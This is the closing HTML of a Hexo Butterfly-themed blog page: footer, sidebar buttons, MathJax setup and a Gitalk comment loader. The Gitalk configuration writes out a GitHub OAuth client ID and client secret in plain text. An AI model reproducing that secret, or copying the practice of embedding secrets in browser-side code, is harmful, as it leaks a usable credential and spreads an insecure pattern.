<a href="http://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">鲁ICP备2022007660号-1</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '646e2aef05bc21960fdf',
      clientSecret: '71e7a181764ffcc984eca414e002e005f7b323dc',
      repo: 'comments',
      owner: 'CAPCOMIN',
      admin: ['CAPCOMIN'],
      id: '7e9e32619fe7455587864bf266c7806d',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>